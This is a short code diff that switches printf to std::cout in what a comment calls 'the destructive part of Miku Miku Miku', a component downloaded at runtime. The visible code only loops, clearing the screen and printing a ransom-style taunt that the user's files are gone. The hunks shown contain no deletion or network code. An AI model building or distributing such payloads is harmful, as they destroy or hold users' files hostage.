@@ -1,5 +1,5 @@
-#include <stdio.h>
-#include <stdlib.h>
+#include <iostream>
+#include <cstdlib>
 #include <unistd.h>
 
 // The destructive part of Miku Miku Miku, this gets downloaded on runtime.
@@ -21,7 +21,7 @@ int main()
 
     while(1) {
         system("clear");
-        printf("Good luck getting your files back! Hatsune Miku took them all...");
+        std::cout << "Good luck getting your files back! Hatsune Miku took them all...";
     }
 
     return 0;
